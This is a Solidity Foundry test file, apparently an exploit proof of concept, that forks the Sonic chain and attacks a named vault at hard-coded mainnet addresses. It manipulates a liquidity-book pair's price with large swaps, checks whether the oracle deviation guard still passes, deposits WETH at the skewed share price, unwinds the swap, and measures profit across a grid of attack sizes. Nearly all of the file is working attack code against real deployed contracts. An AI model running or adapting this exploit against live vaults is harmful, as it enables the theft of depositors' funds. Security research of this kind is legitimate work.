// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns(uint256); function transfer(address,uint256) external returns(bool); function approve(address,uint256) external returns(bool);}
interface IWNative { function deposit() external payable; }
interface IVault {
    function previewShares(uint256,uint256) external view returns(uint256,uint256,uint256);
    function previewAmounts(uint256) external view returns(uint256,uint256);
    function totalSupply() external view returns(uint256);
    function getStrategy() external view returns(address);
    function deposit(uint256,uint256,uint256) external returns(uint256,uint256,uint256);
}
interface IStrategy { function getBalances() external view returns(uint256,uint256); }
interface IOracleHelper { function getPrice() external view returns(uint256); function checkPriceInDeviation() external view returns(bool);}
interface ILBPair { function getActiveId() external view returns(uint24); function swap(bool,address) external returns(bytes32);}

contract Attack is Test {
    address constant VAULT=0x6bE5a84D4A92269eC0Eb228B6c4dAdecED4C7D54;
    address constant PAIR=0x9eDE606c7168bb09fF73EbdE7bFD6FcfaBDA9Bc3;
    address constant WETH=0x50c42dEAcD8Fc9773493ED674b675bE577f2634b;
    address constant WS=0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant OH=0x01c871DfFC36eDC4dDf86FB4a9Bc690B3613a80f;
    IVault v=IVault(VAULT); ILBPair p=ILBPair(PAIR); IStrategy s; address atk=address(0xA11CE);
    uint256 Ptrue; // 128.128 true oracle price before attack

    function setUp() public { vm.createSelectFork("sonic",78400000); s=IStrategy(v.getStrategy()); Ptrue=IOracleHelper(OH).getPrice(); }

    function valWs(uint256 wethAmt, uint256 wsAmt) internal view returns(uint256){ return ((Ptrue*wethAmt)>>128)+wsAmt; }
    function guardOk() internal view returns(bool){ try IOracleHelper(OH).checkPriceInDeviation() returns(bool){return true;} catch {return false;} }

    // Full UP attack: manip with mws wS (buy WETH), deposit dWeth WETH, unwind by selling bought WETH back.
    // returns net profit in wS at true price (can be negative -> reverts show)
    function attackUp(uint256 mws, uint256 dWeth) internal returns(int256 profitWs, uint256 shares, bool ok){
        uint256 snap=vm.snapshotState();
        // fund attacker
        vm.deal(atk, mws); vm.startPrank(atk); IWNative(WS).deposit{value:mws}(); vm.stopPrank();
        deal(WETH, atk, dWeth);
        uint256 valBefore = valWs(IERC20(WETH).balanceOf(atk), IERC20(WS).balanceOf(atk));
        // manipulate up
        vm.startPrank(atk);
        uint256 wethBefore=IERC20(WETH).balanceOf(atk);
        IERC20(WS).transfer(PAIR, mws); p.swap(false, atk);
        uint256 bought=IERC20(WETH).balanceOf(atk)-wethBefore;
        // guard check
        if(!guardOk()){ vm.stopPrank(); vm.revertToState(snap); return (0,0,false); }
        // deposit dWeth
        IERC20(WETH).approve(VAULT, dWeth);
        (shares,,) = v.deposit(dWeth, 0, 0);
        // unwind: sell the bought WETH back to wS
        IERC20(WETH).transfer(PAIR, bought); p.swap(true, atk);
        vm.stopPrank();
        // value position: wallet + redeemable shares at TRUE price (pool restored)
        (uint256 rx,uint256 ry)=v.previewAmounts(shares);
        uint256 valAfter = valWs(IERC20(WETH).balanceOf(atk), IERC20(WS).balanceOf(atk)) + valWs(rx,ry);
        profitWs = int256(valAfter) - int256(valBefore);
        ok=true;
        vm.revertToState(snap);
    }

    function testGrid() public {
        emit log_named_uint("Ptrue_1e6",(Ptrue*1e6)>>128);
        // honest baseline share price
        (uint256 hs,,)=v.previewShares(1e18,0);
        emit log_named_uint("honest_shares_per_1WETH", hs);
        uint256[] memory mws=new uint256[](6);
        mws[0]=50_000e18;mws[1]=100_000e18;mws[2]=150_000e18;mws[3]=180_000e18;mws[4]=200_000e18;mws[5]=220_000e18;
        uint256[] memory dep=new uint256[](4);
        dep[0]=5e18; dep[1]=20e18; dep[2]=50e18; dep[3]=200e18;
        for(uint i=0;i<mws.length;i++){
            for(uint j=0;j<dep.length;j++){
                (int256 pr,uint256 sh,bool ok)=attackUp(mws[i],dep[j]);
                if(ok){
                    emit log_named_string("case", string.concat("mws=",vm.toString(mws[i]/1e18)," dWeth=",vm.toString(dep[j]/1e18)));
                    emit log_named_int("profit_wS", pr);
                    // profit in USD approx via wS price later; also log profit in milli-wS
                }
            }
        }
    }
}
